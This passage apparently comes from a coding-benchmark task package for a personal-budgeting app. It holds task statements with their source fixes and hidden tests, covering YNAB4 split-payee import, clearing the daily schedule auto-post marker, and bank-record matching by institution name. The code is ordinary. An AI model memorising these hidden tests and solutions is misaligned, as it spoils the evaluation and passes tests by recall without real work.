++  currencyCode?: string,
++) {
++  if (currencyCode !== undefined) {
++    const dp = getDecimalPlaces(currencyCode);
++    return integerToCurrency(
++      integerAmount,
++      getNumberFormat({ ...numberFormatConfig, decimalPlaces: dp }).formatter,
++      dp,
++    );
++  }
++
+   // If decimal digits exist, keep them. Otherwise format them as usual.
+   if (integerAmount % 100 !== 0) {
+     return integerToCurrency(
+       integerAmount,
+       getNumberFormat({
+@@ -466,10 +480,14 @@ export function integerToCurrencyWithDecimal(integerAmount: IntegerAmount) {
+   }
+ 
+   return integerToCurrency(integerAmount);
+ }
+ 
++export function amountToCurrencyInteger(amount: number, code: string): number {
++  return amountToInteger(amount, getDecimalPlaces(code));
++}
++
+ export function amountToCurrency(amount: Amount): CurrencyAmount {
+   return getNumberFormat().formatter.format(amount);
+ }
+ 
+ export function amountToCurrencyNoDecimal(amount: Amount): CurrencyAmount {
+
+
+================ TASK 4350045c3b
+---- STATEMENT
+# YNAB4 import: split children lose the parent's payee
+
+A YNAB4 export stores the payee of a split transaction on the parent only; its sub
+transactions carry no payee of their own. After importing such a budget, the
+non-transfer children of a split show up with **no payee**, instead of inheriting
+the parent's payee as split children normally do.
+
+The cause is in how the YNAB4 importer builds the children it sends when adding the
+imported transactions: every non-transfer child is given an explicit `payee` field
+even when no payee was resolved for it (the field is present with an `undefined`
+value). A child that carries a `payee` key is treated as having an explicit payee,
+so it never falls back to the parent's.
+
+## Required behaviour
+
+- When the YNAB4 importer adds a split transaction, a non-transfer child for which
+  no payee was resolved must **not have a `payee` property at all** in the
+  transaction data it submits, so that building the child from its parent gives it
+  the parent's payee.
+- Transfer children are unchanged: they keep the transfer payee of the other
+  account and their `transfer_id` linking them to the counterpart transaction.
+  Non-transfer children keep `transfer_id: null`.
+- The parent keeps its payee and its `imported_payee` (the YNAB4 payee name).
+- The function of the YNAB4 importer module that imports the transactions,
+  `importTransactions(data, entityIdMap, tick)`, must be exported from that module
+  (it is currently module-private) so it can be exercised on its own.
+
+---- DIFF (source + hidden tests: packages/loot-core/src/server/importers/ynab4.test.ts)
+diff --git a/packages/loot-core/src/server/importers/ynab4.test.ts b/packages/loot-core/src/server/importers/ynab4.test.ts
+new file mode 100644
+index 000000000..a55fe9c5b
+--- /dev/null
++++ b/packages/loot-core/src/server/importers/ynab4.test.ts
+@@ -0,0 +1,110 @@
++import { beforeEach, describe, expect, it, vi } from 'vitest';
++
++import { send } from '#server/main-app';
++import { makeChild } from '#shared/transactions';
++
++import { importTransactions } from './ynab4';
++import type * as YNAB4 from './ynab4-types';
++
++vi.mock('#server/main-app', () => ({
++  send: vi.fn(),
++}));
++
++beforeEach(() => {
++  vi.mocked(send).mockReset();
++});
++
++describe('importTransactions', () => {
++  it('gives non-transfer split children the parent payee and keeps transfer children on the transfer payee', async () => {
++    const entityIdMap = new Map<string, string>([
++      ['ynab-account-1', 'actual-account-1'],
++      ['ynab-account-2', 'actual-account-2'],
++      ['ynab-payee-1', 'actual-payee-1'],
++      ['ynab-category-1', 'actual-category-1'],
++    ]);
++
++    // Shaped like a real YNAB4 export: the payee lives on the parent only,
++    // sub transactions carry no payeeId.
++    const split = {
++      entityId: 'txn-split',
++      accountId: 'ynab-account-1',
++      payeeId: 'ynab-payee-1',
++      categoryId: 'Category/__Split__',
++      amount: -1000,
++      date: '2024-10-07',
++      cleared: 'Uncleared',
++      subTransactions: [
++        {
++          entityId: 'sub-1',
++          amount: -50,
++          categoryId: 'ynab-category-1',
++        },
++        {
++          entityId: 'sub-2',
++          amount: -950,
++          categoryId: null,
++          targetAccountId: 'ynab-account-2',
++          transferTransactionId: 'txn-transfer-in',
++        },
++      ],
++    };
++    const transferIn = {
++      entityId: 'txn-transfer-in',
++      accountId: 'ynab-account-2',
++      amount: 950,
++      date: '2024-10-07',
++      cleared: 'Uncleared',
++      targetAccountId: 'ynab-account-1',
++      transferTransactionId: 'sub-2',
++    };
++
++    vi.mocked(send).mockImplementation(async (name: string) => {
++      switch (name) {
++        case 'api/categories-get':
++          return [{ id: 'income-id', name: 'Income' }];
++        case 'api/accounts-get':
++          return [
++            { id: 'actual-account-1', offbudget: false },
++            { id: 'actual-account-2', offbudget: false },
++          ];
++        case 'api/payees-get':
++          return [
++            { id: 'transfer-payee-1', transfer_acct: 'actual-account-1' },
++            { id: 'transfer-payee-2', transfer_acct: 'actual-account-2' },
++          ];
++        case 'api/transactions-add':
++          return null;
++        default:
++          throw new Error(`Unexpected send call: ${name}`);
++      }
++    });
++
++    await importTransactions(
++      {
++        payees: [{ entityId: 'ynab-payee-1', name: 'Some Payee' }],
++        accounts: [],
++        transactions: [split, transferIn],
++      } as unknown as YNAB4.YFull,
++      entityIdMap,
++      vi.fn(),
++    );
++
++    const imported = vi
++      .mocked(send)
++      .mock.calls.filter(([name]) => name === 'api/transactions-add')
++      .flatMap(([, args]) => args.transactions);
++    const parent = imported.find(t => t.id === entityIdMap.get('txn-split'));
++
++    expect(parent.payee).toBe('actual-payee-1');
++    expect(parent.imported_payee).toBe('Some Payee');
++
++    const [child, transferChild] = parent.subtransactions;
++    // No payee key at all, so makeChild falls back to the parent payee
++    expect(child).not.toHaveProperty('payee');
++    expect(child.transfer_id).toBeNull();
++    expect(makeChild(parent, child).payee).toBe('actual-payee-1');
++
++    expect(transferChild.payee).toBe('transfer-payee-2');
++    expect(transferChild.transfer_id).toBe(entityIdMap.get('txn-transfer-in'));
++  });
++});
+diff --git a/packages/loot-core/src/server/importers/ynab4.ts b/packages/loot-core/src/server/importers/ynab4.ts
+index 9809d4053..a2ba6938e 100644
+--- a/packages/loot-core/src/server/importers/ynab4.ts
++++ b/packages/loot-core/src/server/importers/ynab4.ts
+@@ -136,11 +136,11 @@ async function importPayees(
+       tick();
+     }
+   }
+ }
+ 
+-async function importTransactions(
++export async function importTransactions(
+   data: YNAB4.YFull,
+   entityIdMap: Map<string, string>,
+   tick: ImportTick,
+ ) {
+   const categories = await send('api/categories-get');
+@@ -212,11 +212,11 @@ async function importTransactions(
+               )?.name;
+             }
+ 
+             return {
+               transfer_id: transferId,
+-              payee,
++              ...(payee != null ? { payee } : {}),
+               imported_payee,
+             };
+           }
+ 
+           const newTransaction = {
+
+
+================ TASK df4dc0d6cc
+---- STATEMENT
+# Auto-posting schedules created or edited later in the day are not posted until tomorrow
+
+Schedules can be set to post their transactions automatically ("automatically add
+transaction"). The background service that posts due schedule transactions runs at
+most once per calendar day: after it runs, it records the date in the budget's
+`lastScheduleRun` preference and skips any further run on the same date.
+
+So if, after that day's run, the user creates a schedule that posts transactions, or
+edits a schedule so that it posts transactions, an occurrence that is already due
+today is not posted until the next day.
+
+## Required behaviour
+
+- After a schedule is **created** with "posts transactions" enabled, the
+  `lastScheduleRun` marker is cleared (the preference becomes `undefined`), so the
+  auto-posting service may run again today.
+- After a schedule is **updated** and the resulting schedule posts transactions, the
+  marker is cleared as well. This includes updates that do not mention the
+  "posts transactions" field at all (for example a rename) of a schedule whose
+  stored setting already posts transactions: the stored value decides.
+- Creating or updating a schedule that does **not** post transactions leaves the
+  marker untouched.
+- Clearing the marker is harmless: the service only posts occurrences that do not
+  have a transaction yet. Nothing else about creating or updating schedules
+  changes.
+
+---- DIFF (source + hidden tests: packages/loot-core/src/server/schedules/app.test.ts)
+diff --git a/packages/loot-core/src/server/schedules/app.test.ts b/packages/loot-core/src/server/schedules/app.test.ts
+index e83524ba8..84d970716 100644
+--- a/packages/loot-core/src/server/schedules/app.test.ts
++++ b/packages/loot-core/src/server/schedules/app.test.ts
+@@ -2,10 +2,11 @@
+ import MockDate from 'mockdate';
+ 
+ import { aqlQuery } from '#server/aql';
+ import * as db from '#server/db';
+ import { loadMappings } from '#server/db/mappings';
++import * as prefs from '#server/prefs';
+ import { loadRules, updateRule } from '#server/transactions/transaction-rules';
+ import { q } from '#shared/query';
+ import { getNextDate } from '#shared/schedules';
+ 
+ import {
+@@ -1138,6 +1139,70 @@ describe('schedule app', () => {
+         MockDate.reset();
+         await schedulesApp.stopServices();
+       }
+     });
+   });
++
++  describe('auto-post service throttling', () => {
++    const dateCondition = {
++      op: 'is',
++      field: 'date',
++      value: '2020-12-01',
++    } as const;
++
++    beforeEach(async () => {
++      await prefs.loadPrefs();
++      await prefs.savePrefs({ lastScheduleRun: '2020-12-01' });
++    });
++
++    afterEach(() => {
++      prefs.unloadPrefs();
++    });
++
++    it('clears the marker when a schedule that posts transactions is created', async () => {
++      await createSchedule({
++        schedule: { posts_transaction: true },
++        conditions: [dateCondition],
++      });
++
++      expect(prefs.getPrefs().lastScheduleRun).toBeUndefined();
++    });
++
++    it('keeps the marker when the created schedule does not post transactions', async () => {
++      await createSchedule({
++        schedule: { posts_transaction: false },
++        conditions: [dateCondition],
++      });
++
++      expect(prefs.getPrefs().lastScheduleRun).toBe('2020-12-01');
++    });
++
++    it('clears the marker when a schedule starts posting transactions', async () => {
++      const id = await createSchedule({ conditions: [dateCondition] });
++
++      await updateSchedule({ schedule: { id, posts_transaction: true } });
++
++      expect(prefs.getPrefs().lastScheduleRun).toBeUndefined();
++    });
++
++    it('clears the marker when updating a schedule that already posts transactions', async () => {
++      const id = await createSchedule({
++        schedule: { posts_transaction: true },
++        conditions: [dateCondition],
++      });
++
++      await prefs.savePrefs({ lastScheduleRun: '2020-12-01' });
++
++      await updateSchedule({ schedule: { id, name: 'Renamed schedule' } });
++
++      expect(prefs.getPrefs().lastScheduleRun).toBeUndefined();
++    });
++
++    it('keeps the marker when updating a schedule that does not post transactions', async () => {
++      const id = await createSchedule({ conditions: [dateCondition] });
++
++      await updateSchedule({ schedule: { id, name: 'Renamed schedule' } });
++
++      expect(prefs.getPrefs().lastScheduleRun).toBe('2020-12-01');
++    });
++  });
+ });
+diff --git a/packages/loot-core/src/server/schedules/app.ts b/packages/loot-core/src/server/schedules/app.ts
+index 4b3137818..de582a9cf 100644
+--- a/packages/loot-core/src/server/schedules/app.ts
++++ b/packages/loot-core/src/server/schedules/app.ts
+@@ -299,10 +299,27 @@ async function moveSchedule({
+ }) {
+   await db.moveSchedule(id, targetId);
+   return {};
+ }
+ 
++// The auto-posting service is throttled to one run per day through the
++// `lastScheduleRun` pref (see the `sync` event listener at the bottom of this
++// file). A schedule that posts transactions can be created or edited after
++// that run has already happened and still be due today, in which case it
++// would not be posted until the next day. Clearing the marker lets the
++// service run again for the current day; it only posts occurrences that do
++// not have a transaction yet, so an extra run is harmless.
++async function allowAutoPostingToRunAgainToday(postsTransaction: boolean) {
++  if (!postsTransaction) {
++    return;
++  }
++
++  if (prefs.getPrefs()?.lastScheduleRun) {
++    await prefs.savePrefs({ lastScheduleRun: undefined });
++  }
++}
++
+ export async function createSchedule({
+   schedule = null,
+   conditions = [],
+ }: {
+   schedule?: Partial<ScheduleEntity> | null;
+@@ -353,10 +370,12 @@ export async function createSchedule({
+     ...scheduleFields,
+     id: scheduleId,
+     rule: ruleId,
+   });
+ 
++  await allowAutoPostingToRunAgainToday(scheduleFields?.posts_transaction);
++
+   return scheduleId;
+ }
+ 
+ // TODO: don't allow deleting rules that link schedules
+ 
+@@ -447,10 +466,16 @@ export async function updateSchedule({
+     }
+ 
+     await db.updateWithSchema('schedules', scheduleFields);
+   });
+ 
++  const postsTransaction =
++    scheduleFields.posts_transaction ??
++    (await getSchedule(scheduleFields.id))?.posts_transaction;
++
++  await allowAutoPostingToRunAgainToday(postsTransaction);
++
+   return scheduleFields.id;
+ }
+ 
+ export async function deleteSchedule({ id }) {
+   const { data: ruleId } = await aqlQuery(
+
+
+================ TASK 53dae19f70
+---- STATEMENT
+# Bank sync shows the wrong bank for a second connection to the same bank
+
+When accounts are linked through a bank-sync provider, each connection gets a bank
+record (a row of the `banks` table, with the provider's identifier in `bank_id` and
+the institution's display name in `name`); `findOrCreateBank(institution, bankId)`
+in the server's account-linking code finds the record for a connection or creates
+it.
+
+The record is currently looked up by the provider identifier alone. SimpleFIN
+reports the institution's domain as that identifier, so two separate logins at the
+same bank (e.g. one per family member, reported as "Robinhood (Person A)" and
+"Robinhood (Person B)", both with identifier `robinhood.com`) collapse into a single
+bank record, and accounts linked through the second connection are listed under the
+first connection's name on the Bank Sync page.
+
+In addition, some providers report the institution as a plain string rather than an
+object with a `name`; the lookup then fails with an error.
+
+## Required behaviour
+
+`findOrCreateBank(institution, bankId)`:
+
+- `institution` may be an object with a `name` (which may be `null`), a plain
+  string (which is the name), or `null`/`undefined` (no name). The institution
+  name is therefore that string, that `name`, or `null`.
+- An existing bank record is reused only if **both** its `bank_id` equals `bankId`
+  and its `name` equals the institution name, where a `null` name matches a
+  record whose name is `null`. Otherwise a new record is created with that
+  `bank_id` and name.
+- It returns the bank record (at least its `id` and `bank_id`), as today.
+
+Examples, with identifier `robinhood.com`:
+- linking `{ name: 'Robinhood' }` twice → one record, the same `id` both times;
+- `{ name: 'Robinhood (Person A)' }` then `{ name: 'Robinhood (Person B)' }` → two
+  records with different ids and their own names;
+- `null` then `{ name: null }` → one record, with a `null` name;
+- `'Robinhood'` (a string) then `{ name: 'Robinhood' }` → one record.
+
+---- DIFF (source + hidden tests: packages/loot-core/src/server/accounts/link.test.ts)
+diff --git a/packages/loot-core/src/server/accounts/link.test.ts b/packages/loot-core/src/server/accounts/link.test.ts
+new file mode 100644
+index 000000000..4d5667ba8
+--- /dev/null
++++ b/packages/loot-core/src/server/accounts/link.test.ts
+@@ -0,0 +1,89 @@
++import * as db from '#server/db';
++import { loadMappings } from '#server/db/mappings';
++
++import { findOrCreateBank } from './link';
++
++beforeEach(async () => {
++  await global.emptyDatabase()();
++  await loadMappings();
++});
++
++async function getBanks() {
++  return await db.all<db.DbBank>(
++    'SELECT id, bank_id, name FROM banks ORDER BY name',
++  );
++}
++
++describe('findOrCreateBank', () => {
++  it('creates a bank when none exists for the connection', async () => {
++    const bank = await findOrCreateBank({ name: 'Robinhood' }, 'robinhood.com');
++
++    expect(await getBanks()).toEqual([
++      expect.objectContaining({
++        id: bank.id,
++        bank_id: 'robinhood.com',
++        name: 'Robinhood',
++      }),
++    ]);
++  });
++
++  it('reuses the existing bank when the same connection is linked again', async () => {
++    const first = await findOrCreateBank(
++      { name: 'Robinhood' },
++      'robinhood.com',
++    );
++    const second = await findOrCreateBank(
++      { name: 'Robinhood' },
++      'robinhood.com',
++    );
++
++    expect(second.id).toBe(first.id);
++    expect(await getBanks()).toHaveLength(1);
++  });
++
++  it('keeps connections apart when they share an id but report different institutions', async () => {
++    const first = await findOrCreateBank(
++      { name: 'Robinhood (Person A)' },
++      'robinhood.com',
++    );
++    const second = await findOrCreateBank(
++      { name: 'Robinhood (Person B)' },
++      'robinhood.com',
++    );
++
++    expect(second.id).not.toBe(first.id);
++    expect(await getBanks()).toEqual([
++      expect.objectContaining({
++        id: first.id,
++        bank_id: 'robinhood.com',
++        name: 'Robinhood (Person A)',
++      }),
++      expect.objectContaining({
++        id: second.id,
++        bank_id: 'robinhood.com',
++        name: 'Robinhood (Person B)',
++      }),
++    ]);
++  });
++
++  it('reuses the existing bank when the provider reports no institution', async () => {
++    const first = await findOrCreateBank(null, 'robinhood.com');
++    const second = await findOrCreateBank({ name: null }, 'robinhood.com');
++
++    expect(second.id).toBe(first.id);
++    expect(await getBanks()).toEqual([
++      expect.objectContaining({ bank_id: 'robinhood.com', name: null }),
++    ]);
++  });
++
++  it('accepts an institution reported as a plain string', async () => {
++    const first = await findOrCreateBank('Robinhood', 'robinhood.com');
++    const second = await findOrCreateBank(
++      { name: 'Robinhood' },
++      'robinhood.com',
++    );
++
++    expect(second.id).toBe(first.id);
++    expect(await getBanks()).toHaveLength(1);
++  });
++});
+diff --git a/packages/loot-core/src/server/accounts/link.ts b/packages/loot-core/src/server/accounts/link.ts
+index 202ec411b..19f9163e5 100644
+--- a/packages/loot-core/src/server/accounts/link.ts
++++ b/packages/loot-core/src/server/accounts/link.ts
+@@ -1,24 +1,51 @@
+ // @ts-strict-ignore
+ import { v4 as uuidv4 } from 'uuid';
+ 
+ import * as db from '#server/db';
+ 
+-export async function findOrCreateBank(institution, requisitionId) {
++type Institution = string | { name?: string | null };
++
++function getInstitutionName(institution: Institution | null | undefined) {
++  if (typeof institution === 'string') {
++    return institution;
++  }
++  return institution?.name ?? null;
++}
++
++/**
++ * Finds the bank record for a bank-sync connection, creating one if needed.
++ *
++ * The provider identifier alone is not enough to tell connections apart: some
++ * providers (SimpleFIN in particular) report the institution's domain as that
++ * identifier. Two separate logins at the same bank would then share a single
++ * bank record, and accounts linked through the second connection would be
++ * displayed under the first connection's name. Matching on the institution
++ * name as well keeps those connections apart, while still reusing the record
++ * when the same connection is linked again.
++ */
++export async function findOrCreateBank(
++  institution: Institution | null | undefined,
++  bankId: db.DbBank['bank_id'] | undefined,
++): Promise<Pick<db.DbBank, 'id' | 'bank_id'>> {
++  const name = getInstitutionName(institution);
++
++  // `IS` instead of `=` so records with a null name (providers that don't
++  // report an institution) still match.
+   const bank = await db.first<Pick<db.DbBank, 'id' | 'bank_id'>>(
+-    'SELECT id, bank_id FROM banks WHERE bank_id = ?',
+-    [requisitionId],
++    'SELECT id, bank_id FROM banks WHERE bank_id = ? AND name IS ?',
++    [bankId, name],
+   );
+ 
+   if (bank) {
+     return bank;
+   }
+ 
+   const bankData = {
+     id: uuidv4(),
+-    bank_id: requisitionId,
+-    name: institution.name,
++    bank_id: bankId,
++    name,
+   };
+ 
+   await db.insertWithUUID('banks', bankData);
+ 
+   return bankData;
+
